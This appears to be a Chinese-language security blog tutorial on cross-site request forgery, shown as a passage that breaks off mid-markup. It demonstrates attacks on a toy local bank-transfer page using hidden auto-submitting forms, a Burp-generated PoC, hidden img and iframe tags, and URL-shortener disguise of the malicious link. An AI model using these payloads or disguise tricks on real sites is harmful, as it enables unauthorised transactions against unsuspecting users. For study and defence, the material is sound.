{"title":"记一次CSRF的浅学习","uid":"c7fc7ecea32ae48ed7e292e1d2505a50","slug":"记一次CSRF的浅学习","date":"2022-07-22T10:50:30.000Z","updated":"2023-03-14T08:05:44.000Z","comments":true,"path":"api/articles/记一次CSRF的浅学习.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141523274.png","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>CSRF只有简单了解，进行二次学习后总结如下，希望对正在学习CSRF的师傅有所帮助(本人只是小白，可能文章会出现问题，还请各位大师傅多多指点)</p>\n<h1 id=\"漏洞相关信息\"><a href=\"#漏洞相关信息\" class=\"headerlink\" title=\"漏洞相关信息\"></a>漏洞相关信息</h1><h2 id=\"漏洞成因\"><a href=\"#漏洞成因\" class=\"headerlink\" title=\"漏洞成因\"></a>漏洞成因</h2><p>受害者在未退出重要网站的情况下出于好奇心或者其他心理访问了某个恶意链接，而这个恶意链接指向某个网站，比如受害者刚刚登录不久的银行网站，就可以在受害者不知情的情况下进行转账交易。<br>当然，这是个人理解，官方一点的如下</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>主要成因：浏览器cookie不过期，不关闭浏览器或退出登录，都会默认为已登录状态<br>次要成因：对请求合法性验证不严格</p></blockquote>\n<h2 id=\"漏洞定义\"><a href=\"#漏洞定义\" class=\"headerlink\" title=\"漏洞定义\"></a>漏洞定义</h2><p>CSRF，即<code>Cross Site Request Forgery</code>，译为跨站点请求伪造，看起来似乎与XSS(跨站脚本攻击)是相像的，但两者实际上大相径庭，XSS是获取到网站信任用户的具体信息，进行攻击，而而CSRF则通过伪装成受信任用户进行攻击。对CSRF用一个简单的事例来进行讲解</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、老八访问www<span class=\"token operator\">.</span>bank<span class=\"token operator\">.</span>com<span class=\"token punctuation\">,</span>登录后存入<span class=\"token number\">100</span>元\n<span class=\"token number\">2</span>、老八存过钱后未关闭网站，浏览其他网站时发现有一个名字为<span class=\"token number\">3060</span>显卡<span class=\"token number\">100</span>元处理的广告，老八点击访问\n<span class=\"token number\">3</span>、访问后发现什么也没有，老八大失所望，悻悻的离开网站\n<span class=\"token number\">4</span>、老八再次查看银行时，发现刚刚的钱被转走了<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这个过程是怎么实现的呢，我们看一下这个链接的内容</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>html<span class=\"token operator\">></span>\n  <span class=\"token operator\">&lt;</span>body<span class=\"token operator\">></span>\n  <span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span>history<span class=\"token operator\">.</span><span class=\"token function\">pushState</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span>\n    <span class=\"token operator\">&lt;</span>form action<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"http://www.bank.com\"</span> method<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"POST\"</span><span class=\"token operator\">></span>\n      <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hidden\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"money\"</span> value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"100\"</span> <span class=\"token operator\">/</span><span class=\"token operator\">></span>\n      <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hidden\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"submit\"</span> value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"submit\"</span> <span class=\"token operator\">/</span><span class=\"token operator\">></span>\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>form<span class=\"token operator\">></span>\n  <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>body<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>html<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>可以发现当访问它的时候，它自动进行了一个表单的提交，将100块钱进行了转出，而表面是什么也没有的（这个例子存在部分小问题，比如代码中没以有具体写转向了哪里，但不影响整体理解），这个时候老八刚刚存入的100就不翼而飞了。流程图的话，如下所示<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152982.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"漏洞危害\"><a href=\"#漏洞危害\" class=\"headerlink\" title=\"漏洞危害\"></a>漏洞危害</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>1、篡改目标网站上的用户数据<br>2、盗取用户隐私数据<br>3、作为其他攻击向量的辅助攻击手法<br>4、 传播CSRF蠕虫</p></blockquote>\n<h1 id=\"常见类型\"><a href=\"#常见类型\" class=\"headerlink\" title=\"常见类型\"></a>常见类型</h1><h2 id=\"GET上传\"><a href=\"#GET上传\" class=\"headerlink\" title=\"GET上传\"></a>GET上传</h2><p>针对GET类型，这个比较简单，我们只需要构造一个虚假链接，在里面添上我们的payload即可，构造如下所示<br>假设银行转账界面为877.php，代码如下所示</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token variable\">$money</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'money'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$user</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"向 <span class=\"token interpolation\"><span class=\"token variable\">$user</span></span> 转账成功，金额为 <span class=\"token interpolation\"><span class=\"token variable\">$money</span></span>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>此时攻击者构造恶意界面为1.php，具体代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>html<span class=\"token operator\">></span>\n    <span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"http://127.0.0.1:8080/html/877.php?user=hacker&amp;money=100\"</span><span class=\"token operator\">></span>杀马特团长的故事<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>html<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>此时我们访问1.php<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152945.png\" alt=\"在这里插入图片描述\"><br>当受害者出于好奇访问此链接时<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152973.png\" alt=\"在这里插入图片描述\"></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>img src<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"http://bank.com/?money=100&amp;user=hacker\"</span> style<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"display:none;\"</span><span class=\"token operator\">/</span><span class=\"token operator\">></span>\n<span class=\"token comment\">//这里的style=\"display:none;\"指的是隐藏元素</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>对<code> style=&quot;display:none;&quot;</code>讲解具体示例如下<br>示例代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>html<span class=\"token operator\">></span>\n\n<span class=\"token operator\">&lt;</span>head<span class=\"token operator\">></span>\n\n<span class=\"token operator\">&lt;</span>title<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>title<span class=\"token operator\">></span>\n\n<span class=\"token operator\">&lt;</span>style type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"text/css\"</span><span class=\"token operator\">></span>\n\n    div<span class=\"token punctuation\">&#123;</span>\n\n        background<span class=\"token punctuation\">:</span> lightblue<span class=\"token punctuation\">;</span>\n\n        width<span class=\"token punctuation\">:</span> <span class=\"token number\">200</span>px<span class=\"token punctuation\">;</span>\n\n        height<span class=\"token punctuation\">:</span> <span class=\"token number\">200</span>px<span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">&#125;</span>\n\n    span<span class=\"token punctuation\">&#123;</span>\n\n        background<span class=\"token punctuation\">:</span> pink<span class=\"token punctuation\">;</span>\n\n        \n\n    <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>style<span class=\"token operator\">></span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>head<span class=\"token operator\">></span>\n\n<span class=\"token operator\">&lt;</span>body <span class=\"token operator\">></span>\n\n    <span class=\"token operator\">&lt;</span>div<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>span<span class=\"token operator\">></span>需要隐藏的区域<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>span<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>div<span class=\"token operator\">></span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>body<span class=\"token operator\">></span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>html<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>此时访问这个界面<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152953.png\" alt=\"在这里插入图片描述\"><br>而当我们在<code>background: pink;</code>后加上<code>display:none;</code>时</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>html<span class=\"token operator\">></span>\n\n<span class=\"token operator\">&lt;</span>head<span class=\"token operator\">></span>\n\n<span class=\"token operator\">&lt;</span>title<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>title<span class=\"token operator\">></span>\n\n<span class=\"token operator\">&lt;</span>style type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"text/css\"</span><span class=\"token operator\">></span>\n\n    div<span class=\"token punctuation\">&#123;</span>\n\n        background<span class=\"token punctuation\">:</span> lightblue<span class=\"token punctuation\">;</span>\n\n        width<span class=\"token punctuation\">:</span> <span class=\"token number\">200</span>px<span class=\"token punctuation\">;</span>\n\n        height<span class=\"token punctuation\">:</span> <span class=\"token number\">200</span>px<span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">&#125;</span>\n\n    span<span class=\"token punctuation\">&#123;</span>\n\n        background<span class=\"token punctuation\">:</span> pink<span class=\"token punctuation\">;</span>\n        display<span class=\"token punctuation\">:</span> none<span class=\"token punctuation\">;</span>\n        \n\n    <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>style<span class=\"token operator\">></span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>head<span class=\"token operator\">></span>\n\n<span class=\"token operator\">&lt;</span>body <span class=\"token operator\">></span>\n\n    <span class=\"token operator\">&lt;</span>div<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>span<span class=\"token operator\">></span>需要隐藏的区域<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>span<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>div<span class=\"token operator\">></span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>body<span class=\"token operator\">></span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>html<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>此时访问界面<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152931.png\" alt=\"在这里插入图片描述\"><br>成功隐藏此界面</p>\n<h2 id=\"POST上传\"><a href=\"#POST上传\" class=\"headerlink\" title=\"POST上传\"></a>POST上传</h2><p>对于POST类型上传的，我们这个时候需要构造一个表单来进行提交，这个相对GET是比较麻烦的，不过我们这里可以简化一下，使用burpsuite工具来迅速构造出对应的表单，举例如下<br>银行转账界面仍877.php，其代码如下所示</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token variable\">$money</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'money'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$user</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"向 <span class=\"token interpolation\"><span class=\"token variable\">$user</span></span> 转账成功，金额为 <span class=\"token interpolation\"><span class=\"token variable\">$money</span></span>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>我们访问这个界面，自己先赋值一下，获取到参数，然后抓包<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152992.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152403.png\" alt=\"在这里插入图片描述\"><br>发包到重放模块，修改用户名和金额<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152443.png\" alt=\"在这里插入图片描述\"><br>构造poc<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152461.png\" alt=\"在这里插入图片描述\"><br>将内容复制到我们的恶意链接，也就是1.php中</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>html<span class=\"token operator\">></span>\n  <span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span> <span class=\"token constant\">CSRF</span> PoC <span class=\"token operator\">-</span> generated by Burp Suite Professional <span class=\"token operator\">--</span><span class=\"token operator\">></span>\n  <span class=\"token operator\">&lt;</span>body<span class=\"token operator\">></span>\n  <span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span>history<span class=\"token operator\">.</span><span class=\"token function\">pushState</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span>\n    <span class=\"token operator\">&lt;</span>form action<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"http://127.0.0.1:8080/html/877.php/\"</span> method<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"POST\"</span><span class=\"token operator\">></span>\n      <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hidden\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"money\"</span> value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"100\"</span> <span class=\"token operator\">/</span><span class=\"token operator\">></span>\n      <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hidden\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"user\"</span> value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hacker\"</span> <span class=\"token operator\">/</span><span class=\"token operator\">></span>\n      <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"submit\"</span> value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"Submit request\"</span> <span class=\"token operator\">/</span><span class=\"token operator\">></span>\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>form<span class=\"token operator\">></span>\n  <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>body<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>html<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>此时当用户点击这个恶意链接时，界面如下<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152433.png\" alt=\"在这里插入图片描述\"></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152470.png\" alt=\" \"></p>\n<h2 id=\"token验证\"><a href=\"#token验证\" class=\"headerlink\" title=\"token验证\"></a>token验证</h2><p>当随机生成token时，有两种方式，一种是通过xss获取当前界面的token，与此同时构造恶意链接，另一种是直接利用burpsuite的CSRF token插件来进行自动更新token<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152537.png\" alt=\"在这里插入图片描述\"><br>具体的话在下方中靶场实战时进行讲解</p>\n<h1 id=\"攻击思路\"><a href=\"#攻击思路\" class=\"headerlink\" title=\"攻击思路\"></a>攻击思路</h1><p>一般对于GET型，大多是利用标签来进行攻击，这个方式是有效且快捷的，因此我们这里先大致罗列一下常用的标签<br>而针对POST型的话，一般都是构造表单，这个的话我们就利用bp的CSRF PoC就可以生成对应的表单。<br>下面来大致讲解一下GET型时可以利用的标签</p>\n<h2 id=\"常用标签\"><a href=\"#常用标签\" class=\"headerlink\" title=\"常用标签\"></a>常用标签</h2><p>超链接标签</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>a<span class=\"token operator\">></span>标签：<span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"http://xxx.com/?user=xx&amp;money=xx\"</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>img标签</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>img<span class=\"token operator\">></span>标签<span class=\"token punctuation\">:</span> <span class=\"token operator\">&lt;</span>img src<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"http://xxx.com/?user=xx&amp;money=xx\"</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>iframe标签</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>iframe<span class=\"token operator\">></span>标签：<span class=\"token operator\">&lt;</span>iframe src<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"http://xxx.com/?user=xx&amp;moeny=xx\"</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>由于前两个在之前示例中已经讲过，所以这里不再举例子，这里的话讲解一下iframe标签，<br>先创建一个银行界面（GET型），命名为877.php，内容如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token variable\">$money</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'money'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$user</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"向 <span class=\"token interpolation\"><span class=\"token variable\">$user</span></span> 转账成功，金额为 <span class=\"token interpolation\"><span class=\"token variable\">$money</span></span>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>此时我们构造恶意链接，命名为1.php，内容如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>html<span class=\"token operator\">></span>\n  <span class=\"token operator\">&lt;</span>body<span class=\"token operator\">></span>\n    <span class=\"token operator\">&lt;</span>iframe src<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"http://127.0.0.1:8080/html/877.php?user=hacker&amp;money=1000\"</span> style<span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"display:none\"</span><span class=\"token punctuation\">;</span><span class=\"token operator\">></span>\n  <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>body<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>html<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>当我们访问1.php的时候发现全是空白，这是因为<code>style= &quot;display:none&quot;;</code>隐藏了元素，当我们把这个去掉的时候<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152925.png\" alt=\"在这里插入图片描述\"><br>可以发现成功转账了</p>\n<h2 id=\"短链接伪装\"><a href=\"#短链接伪装\" class=\"headerlink\" title=\"短链接伪装\"></a>短链接伪装</h2><p>当我们使用超链接时，就算用中文来进行掩饰，但下方的超链接仍然会暴露出来，此时如果受害者发现的话就不会再点击这个链接了，这个时候我们可以对链接进行一定的伪装，我们知道一串较长的链接可以通过短地址来进行缩短，因此我们这里就可以通过缩短链接来进行伪装</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152970.png\" alt=\"在这里插入图片描述\"><br>网上有很多短链接生成工具，这里我随便用一个，链接如下<a href=\"http://ddz.ee/\">http://ddz.ee/</a><br>输入我们的恶意代码，即<code>http://127.0.0.1:8080/html/877.php?user=hacker&amp;money=1000</code><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152045.png\" alt=\"在这里插入图片描述\"></p>\n<p>将生成的链接放到1.php中，替换到原来的，具体如下图</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>html<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"http://ddz.ee/A8PF7\"</span><span class=\"token operator\">></span>虎哥的东北往事<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>body<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>html<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>此时我们访问这个1.php<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152005.png\" alt=\"在这里插入图片描述\"><br>可以发现变成了这个，没有那么明显了，点击过后<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152013.png\" alt=\"在这里插入图片描述\"></p>\n<p>成功进行了转账</p>\n<h1 